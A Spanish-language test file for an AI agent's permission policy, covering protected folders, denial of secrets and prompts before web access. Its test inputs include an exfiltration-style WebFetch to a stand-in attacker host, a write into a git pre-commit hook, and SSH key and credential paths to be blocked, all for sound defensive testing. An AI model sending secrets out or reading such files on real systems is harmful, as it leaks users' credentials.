import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { defaultSettings, type AgentQuestion, type PermissionLevel } from '@orquestador/core';
import { ALLOW_ONCE, ALLOW_RUN, DENY, SENSITIVE_DENY, baseOptions, confine, createWritePolicy, folderRule, isSensitivePath, protectedName, readRule, sameOrInside, sensitiveCommand } from '../src';

let dir: string;
let work: string;
let project: string;
let appData: string;
beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'orq-conf-'));
  project = join(dir, 'proyecto');
  work = join(project, 'trabajo');
  appData = join(dir, 'datos-app');
  await mkdir(join(work, 'src'), { recursive: true });
  await mkdir(join(appData, 'spaces', 'r1'), { recursive: true });
  await writeFile(join(work, 'src', 'a.ts'), 'x');
});
afterEach(() => rm(dir, { recursive: true, force: true }));

describe('SPEC-087 · ~/.claude entero', () => {
  it('[R87.5] lo de Claude Code en ~/.claude se lee sin preguntar; su .credentials.json no', async () => {
    const asked: AgentQuestion[] = [];
    const canUse = createWritePolicy({ root: work, level: 'readonly', readRoots: [join(homedir(), '.claude')], ask: async (q) => (asked.push(q), DENY), backup: async () => undefined });
    expect(await canUse('Read', { file_path: join(homedir(), '.claude', 'projects', 'x', 'salida.txt') })).toMatchObject({ behavior: 'allow' });
    expect(await canUse('Read', { file_path: join(homedir(), '.claude', '.credentials.json') })).toMatchObject({ behavior: 'deny' });
    expect(asked).toHaveLength(0);
  });
});

function policy(level: PermissionLevel, answers: string[] = [], root = work) {
  const asked: AgentQuestion[] = [];
  const notes: { kind: string; path: string; reason?: string }[] = [];
  const grants = new Set<string>();
  const canUse = createWritePolicy({
    root,
    level,
    readRoots: [project],
    protectedDirs: [appData],
    commandGrants: grants,
    ask: async (q) => (asked.push(q), answers.shift() ?? DENY),
    backup: async () => undefined,
    note: (e) => void notes.push(e),
  });
  return { canUse, asked, notes, grants };
}

const win = (...parts: string[]) => parts.join('\\');

describe('SPEC-087 · A2: carpetas protegidas como las ve Windows', () => {
  it('[R87.1] mayúsculas, puntos o espacios finales y flujos de NTFS cuentan como .git, node_modules u .orquestador', async () => {
    for (const s of ['.git', '.GIT', '.Git', 'NODE_MODULES', '.Orquestador']) expect(protectedName(s, 'linux')).toBe(true);
    for (const s of ['.git.', '.git ', '.git. .', '.git::$INDEX_ALLOCATION', '.ORQUESTADOR.']) expect(protectedName(s, 'win32')).toBe(true);
    expect(protectedName('.git.', 'linux')).toBe(false);
    expect(protectedName('.github', 'win32')).toBe(false);
    expect(await confine(work, '.GIT/hooks/pre-commit')).toBeNull();
    expect(await confine(work, '.Orquestador/agents/a.json')).toBeNull();
    expect(await confine(work, 'src/b.ts')).not.toBeNull();
    expect(sensitiveCommand('echo x > .GIT/hooks/pre-commit', work)).not.toBeNull();
  });

  it('[R87.1] E87.b: con «Preguntar», escribir .GIT/hooks/pre-commit se deniega', async () => {
    const { canUse, asked } = policy('ask');
    expect(await canUse('Write', { file_path: join(work, '.GIT', 'hooks', 'pre-commit'), content: 'x' })).toMatchObject({ behavior: 'deny' });
    expect(asked).toHaveLength(0);
  });

  it('[R87.2] con «Sin preguntar nunca», .orquestador en otras mayúsculas o con punto final también queda protegido', async () => {
    const { canUse } = policy('full');
    // Linux distingue mayúsculas: ahí `.ORQUESTADOR` es otra carpeta.
    expect(await canUse('Write', { file_path: join(work, '.ORQUESTADOR', 'x.json'), content: 'x' })).toMatchObject({ behavior: process.platform === 'linux' ? 'allow' : 'deny' });
    expect(sameOrInside('/Users/u/p/.ORQUESTADOR/x', '/Users/u/p/.orquestador', 'darwin')).toBe(true);
    expect(sameOrInside('/home/u/p/.ORQUESTADOR/x', '/home/u/p/.orquestador', 'linux')).toBe(false);
    expect(sameOrInside(win('C:', 'p', '.orquestador.', 'x'), win('C:', 'p', '.orquestador'), 'win32')).toBe(true);
    expect(sameOrInside(win('C:', 'P', '.Orquestador::$DATA', 'x'), win('c:', 'p', '.orquestador'), 'win32')).toBe(true);
    expect(sameOrInside(win('C:', 'p', '.orquestadorx'), win('C:', 'p', '.orquestador'), 'win32')).toBe(false);
  });
});

describe('SPEC-087 · A1: lecturas', () => {
  it('[R87.3] los pasos de agente no aprueban solas las lecturas ni la web; las consultas sin herramientas no cambian', () => {
    const base = { settings: defaultSettings(), apiKey: undefined, cwd: work, controller: new AbortController() };
    expect(baseOptions({ ...base, toolList: ['Read', 'WebFetch', 'Agent'], claudeCode: true }).allowedTools).toEqual(['Agent']);
    expect(baseOptions({ ...base }).allowedTools).toEqual(expect.arrayContaining(['Read', 'Glob', 'Grep']));
  });

  it('[R87.4][R87.7] E87.a: los secretos se deniegan en cualquier nivel y sin preguntar', async () => {
    for (const level of ['readonly', 'ask', 'auto', 'full'] as const) {
      const { canUse, asked, notes } = policy(level);
      expect(await canUse('Read', { file_path: join(homedir(), '.ssh', 'id_rsa') })).toEqual({ behavior: 'deny', message: SENSITIVE_DENY });
      expect(await canUse('Read', { file_path: join(work, '.env') })).toMatchObject({ behavior: 'deny' });
      expect(await canUse('Grep', { pattern: 'KEY', glob: '**/.env*' })).toMatchObject({ behavior: 'deny' });
      expect(await canUse('Read', { file_path: join(homedir(), '.claude', '.credentials.json') })).toMatchObject({ behavior: 'deny' });
      expect(await canUse('Read', { file_path: join(appData, 'config', 'settings.json') })).toMatchObject({ behavior: 'deny' });
      expect(asked).toHaveLength(0);
      expect(notes.length).toBeGreaterThan(0);
      expect(notes.every((n) => n.kind === 'denied')).toBe(true);
    }
    expect(isSensitivePath('C:/Users/a/.claude/.credentials.json')).toBe(true);
  });

  it('[R87.4][R87.5] una rama aislada lee su propia carpeta aunque esté dentro de los datos de la app', async () => {
    const space = join(appData, 'spaces', 'r1');
    const { canUse, asked } = policy('ask', [], space);
    expect(await canUse('Read', { file_path: join(space, 'a.ts') })).toMatchObject({ behavior: 'allow' });
    expect(asked).toHaveLength(0);
  });

  it('[R87.5] dentro de la carpeta de trabajo, del proyecto o de ~/.claude, y los patrones sin ruta, se leen sin preguntar', async () => {
    const { canUse, asked } = policy('readonly');
    expect(await canUse('Read', { file_path: join(work, 'src', 'a.ts') })).toMatchObject({ behavior: 'allow' });
    expect(await canUse('Read', { file_path: join(project, 'README.md') })).toMatchObject({ behavior: 'allow' });
    expect(await canUse('Glob', { pattern: 'src/**/*.ts' })).toMatchObject({ behavior: 'allow' });
    expect(await canUse('Grep', { pattern: 'TODO' })).toMatchObject({ behavior: 'allow' });
    expect(asked).toHaveLength(0);
  });

  it('[R87.6] fuera: «Automático» lee sin preguntar; «Preguntar» pregunta y «Permitir en esta ejecución» vale para las siguientes', async () => {
    const outside = join(dir, 'otro', 'notas.txt');
    const auto = policy('auto');
    expect(await auto.canUse('Read', { file_path: outside })).toMatchObject({ behavior: 'allow' });
    expect(auto.asked).toHaveLength(0);
    const ask = policy('ask', [ALLOW_RUN]);
    expect(await ask.canUse('Read', { file_path: outside })).toMatchObject({ behavior: 'allow' });
    expect(ask.asked[0]).toMatchObject({ text: `¿Puedo leer fuera de la carpeta de trabajo?\n${outside}`, options: [ALLOW_ONCE, ALLOW_RUN, DENY], kind: 'permission' });
    expect(await ask.canUse('Glob', { pattern: `${join(dir, 'otro')}/**/*.md` })).toMatchObject({ behavior: 'allow' });
    expect(ask.asked).toHaveLength(1);
    const ro = policy('readonly', [DENY]);
    expect(await ro.canUse('Read', { file_path: outside })).toMatchObject({ behavior: 'deny' });
    expect(ro.notes.at(-1)).toMatchObject({ kind: 'denied', reason: 'lectura fuera de la carpeta' });
  });
});

describe('SPEC-087 · A1: web', () => {
  it('[R87.8] E87.a: WebFetch pregunta por dominio una vez por ejecución; una dirección rara se deniega; «Automático» no pregunta', async () => {
    const { canUse, asked } = policy('readonly', [DENY, 'Permitir docs.example.com en esta ejecución']);
    expect(await canUse('WebFetch', { url: 'https://atacante.example/?d=secreto', prompt: 'x' })).toMatchObject({ behavior: 'deny' });
    expect(asked[0]).toMatchObject({ text: '¿Puedo abrir atacante.example?', options: ['Permitir atacante.example en esta ejecución', DENY] });
    expect(await canUse('WebFetch', { url: 'https://docs.example.com/a', prompt: 'x' })).toMatchObject({ behavior: 'allow' });
    expect(await canUse('WebFetch', { url: 'https://docs.example.com/b', prompt: 'x' })).toMatchObject({ behavior: 'allow' });
    expect(asked).toHaveLength(2);
    expect(await canUse('WebFetch', { url: 'no es una url', prompt: 'x' })).toMatchObject({ behavior: 'deny' });
    const auto = policy('auto');
    expect(await auto.canUse('WebFetch', { url: 'https://cualquiera.example', prompt: 'x' })).toMatchObject({ behavior: 'allow' });
    expect(auto.asked).toHaveLength(0);
  });

  it('[R87.9] WebSearch pregunta una vez por ejecución', async () => {
    const { canUse, asked } = policy('ask', ['Permitir buscar en esta ejecución']);
    expect(await canUse('WebSearch', { query: 'a' })).toMatchObject({ behavior: 'allow' });
    expect(await canUse('WebSearch', { query: 'b' })).toMatchObject({ behavior: 'allow' });
    expect(asked.map((q) => q.text)).toEqual(['¿Puedo buscar en la web?']);
  });
});

describe('SPEC-087 · textos', () => {
  it('[R87.10] el prompt dice qué se lee según el nivel y que los secretos nunca', () => {
    expect(readRule('ask')).toContain('pide permiso');
    expect(readRule('readonly')).toContain('web');
    expect(readRule('auto')).toContain('sin preguntar');
    for (const l of ['readonly', 'ask', 'auto', 'full'] as const) expect(folderRule(l)).toContain('secretos');
  });
});
